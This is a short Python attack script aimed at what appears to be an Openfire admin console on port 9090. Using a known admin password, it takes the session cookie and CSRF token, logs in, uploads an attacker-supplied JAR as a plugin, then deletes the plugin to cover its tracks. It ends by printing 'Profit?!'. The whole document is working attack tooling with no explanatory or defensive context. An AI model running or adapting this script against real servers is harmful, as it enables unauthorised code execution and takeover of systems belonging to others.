#!/usr/bin/python3

import requests
import sys
import magic
import pathlib

if len(sys.argv) <= 3:
    print(f'USAGE: python3 {sys.argv[0]} <admin_password> <Target_IP> <Jar_File>')
    exit(1)

#get cookie and jessionid
get_csrf = f'http://{sys.argv[2]}:9090/login.jsp'
session = requests.Session()
r = session.get(get_csrf)
cook = session.cookies.get_dict()
jsessionid = cook['JSESSIONID']
print('[+] Get JSESSIONID & CSRF Token')
csrf = cook['csrf']

#login
print('[-] Logging in as administrator')
login_url = f'http://{sys.argv[2]}:9090/login.jsp'
data = f'url=%2Findex.jsp&login=true&csrf={csrf}&username=admin&password={sys.argv[1]}'
sess = requests.Session()
r = sess.post(login_url, data=data, headers={"Content-Type":"application/x-www-form-urlencoded","Cookie":f"JSESSIONID={jsessionid}; csrf={csrf}"})
cook = sess.cookies.get_dict()
csrf2 = cook['csrf']
print('[+] Logged in Admin Console')

#upload jar plugin file
print('[-] Uploading plugin file')
jar_url = f'http://{sys.argv[2]}:9090/plugin-admin.jsp?uploadplugin&csrf={csrf2}'
mime = magic.Magic(mime=True)
file_extension = pathlib.Path(f'{sys.argv[3]}').suffix
jar_file = {('filename', (f'doesntmatter{file_extension}', open(f'{sys.argv[3]}','rb'), mime.from_file(f'{sys.argv[3]}')))}
t = requests.post(jar_url, files=jar_file, headers={"Cookie":f"JSESSIONID={jsessionid}; csrf={csrf2}"})
print('[+] Uploaded Plugin')

#delete plugin
print('[-] Deleting Plugin')
y = requests.get(f'http://{sys.argv[2]}:9090/plugin-admin.jsp?csrf={csrf2}&deleteplugin=doesntmatter', headers={"Cookie":f"JSESSIONID={jsessionid}; csrf={csrf2}"})
print('[+] Deleted Plugin')
print('[+] Profit?!')
